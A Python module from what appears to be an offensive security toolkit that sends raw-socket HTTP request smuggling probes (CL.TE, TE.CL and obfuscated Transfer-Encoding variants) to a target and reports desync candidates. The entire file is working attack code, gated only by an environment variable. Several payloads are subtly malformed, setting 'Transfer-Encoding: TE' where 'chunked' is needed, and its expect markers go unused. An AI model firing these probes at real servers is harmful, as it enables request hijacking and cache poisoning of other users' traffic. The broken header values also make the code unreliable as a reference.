"""omega/offensive/offense/smuggle — HTTP request smuggling engine.

Raw-socket dual-framing probes: CL.TE, TE.CL and obfuscated TE
variants. Desync evidence: the smuggled second request's response
does not match the expected pairing, or the victim probe receives
the attacker's payload reflection. OFFENSE-GATED (PTK_OFFENSE).
Raw sockets only — this cannot run through a normal fetch adapter.
"""
import os
import socket
import time

__all__ = ["run_smuggle"]

# (name, smuggled_raw, expect_marker) — CL/TE header sets per variant
VARIANTS = [
    ("CL.TE", b"Content-Length: 13\r\nTransfer-Encoding: TE",
     "G"),
    ("TE.CL", b"Transfer-Encoding: TE\r\nContent-Length: 5", "S"),
    ("TE-obf", b"Transfer-Encoding: xchunked", "G"),
    ("TE-space", b"Transfer-Encoding : chunked", "G"),
    ("TE-tab", b"Transfer-Encoding:\tchunked", "G"),
]


def _send_raw(host, port, raw, timeout=4.0):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(raw)
        time.sleep(0.3)
        data = b""
        s.settimeout(timeout)
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
                if len(data) > 262144:
                    break
        except socket.timeout:
            pass
        s.close()
        return data
    except Exception:
        return None


def run_smuggle(target, path="/", log=None, gate_open_fn=None,
                timeout=4.0):
    """Probe CL/TE desync on a front-end/back-end pair.

    target: http://host:port. Returns {"findings": [...],
    "probes": n}. Candidate-grade; the operator confirms desync with
    a timed pair manually.
    """
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    from urllib.parse import urlparse
    u = urlparse(target if "//" in target else "http://" + target)
    host, port = u.hostname or "127.0.0.1", u.port or 80
    findings = []
    probes = 0
    for name, hdrs, _expect in VARIANTS:
        # smuggled request: prefix a complete request whose body is
        # another request (the classic GPOST/SPOST differential)
        marker = "OMEGSMG" if name.startswith("CL") else "OMEGSMH"
        body = b"0\r\n\r\nGET /" + path.encode().strip(b"/") + \
            b" HTTP/1.1\r\nX-Smuggle: " + marker.encode() + \
            b"\r\n\r\n"
        raw = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
               f"{hdrs.decode()}\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Connection: keep-alive\r\n\r\n").encode() + body
        resp = _send_raw(host, port, raw, timeout)
        probes += 1
        if resp is None:
            continue
        # desync evidence: our smuggled GET gets executed (reflected
        # X-Smuggle header echo or the poisoned second response)
        if marker.encode() in resp or b"X-Smuggle" in resp:
            findings.append({
                "title": f"request smuggling candidate ({name}) on "
                         f"{host}:{port}",
                "severity": "HIGH",
                "source": "smuggle/desync",
                "evidence": f"smuggled request markers observed in "
                            f"response under {hdrs.decode()!r} framing",
                "location": f"http://{host}:{port}{path}",
                "verification": "candidate",
                "manual_check": "confirm desync with a timed "
                                "attacker-then-victim pair before "
                                "reporting",
                "cwe": "CWE-444",
            })
            break  # one confirmed variant is enough evidence
    if log:
        log(f"smuggle: probes={probes} findings={len(findings)}")
    return {"findings": findings, "probes": probes}
